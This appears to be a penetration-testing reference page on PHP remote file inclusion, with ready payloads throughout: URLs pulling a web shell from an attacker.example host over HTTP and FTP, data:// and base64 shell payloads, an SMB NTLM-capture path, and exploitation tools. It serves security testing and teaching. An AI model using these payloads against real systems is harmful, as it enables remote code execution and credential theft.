---
title: "Remote file inclusion: running attacker-hosted code"
description: "RFI points an include sink at an attacker-controlled URL so the interpreter fetches and executes external code, gated by allow_url_include and allow_url_fopen."
keywords:
  - remote file inclusion
  - RFI
  - allow_url_include
  - allow_url_fopen
  - data wrapper
  - php include
---

# Remote

Remote file inclusion occurs when an include/require sink accepts a full URL, so the interpreter fetches code from a host the attacker controls and runs it in the application's context. It is the most direct inclusion-to-RCE path because no local write or poisoning step is needed.

## The condition

In PHP, remote inclusion requires `allow_url_include = On` (and, for the fetch, `allow_url_fopen = On`). Both default to `Off` in modern builds, so RFI is mostly found on legacy or deliberately misconfigured stacks. Where the setting is on, a sink like `include($_GET['page'])` loads whatever URL you supply.

## HTTP include

Host a payload and point the sink at it. The remote file must contain raw PHP; keep the handler from executing it locally by serving it as plain text or using an extension your own server does not run:

```
?page=http://attacker.example/shell.txt
```

`shell.txt`:

```php
<?php system($_GET['c']); ?>
```

Then drive it:

```
?page=http://attacker.example/shell.txt&c=id
```

A `?` on the end of the attacker URL swallows any extension the application appends, so `include($_GET['page'].'.php')` fetches `shell.txt?` and ignores the `.php`:

```
?page=http://attacker.example/shell.txt?
```

## FTP and other schemes

When outbound HTTP is filtered but other fetchers are allowed, the FTP wrapper serves the same role:

```
?page=ftp://attacker.example/shell.txt
```

SMB paths (`\\attacker\share\shell.php`) can work against Windows/PHP targets, and double as an NTLM-hash capture vector when the server authenticates to your listener.

## data:// as self-contained RFI

With `allow_url_include` on, the `data://` wrapper carries the code in the request itself, needing no external host:

```
?page=data://text/plain,<?php system($_GET['c']); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
```

This is handy when the target cannot reach back out to your infrastructure but still honors URL includes.

## Beyond PHP

The same shape appears in other ecosystems whenever a template or module loader takes a remote location: server-side template engines that fetch includes over HTTP, JSP/JSF resource loaders, and Node loaders that `require` a dynamically built path. The pivot is identical, redirect the loader to attacker-controlled code, and the payload language follows the platform.

## Tools

- **[fimap](https://github.com/kurobeats/fimap)**: automated remote and local file-inclusion exploitation.
- **[kadimus](https://github.com/P0cL4bs/Kadimus)**: RFI and LFI detection and exploitation.
- **[Burp Suite](https://portswigger.net/burp)**: Repeater for pointing the sink at attacker-hosted code.

## References

- [OWASP: Testing for Remote File Inclusion](https://owasp.org/www-project-web-security-testing-guide/)
- [PayloadsAllTheThings: File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
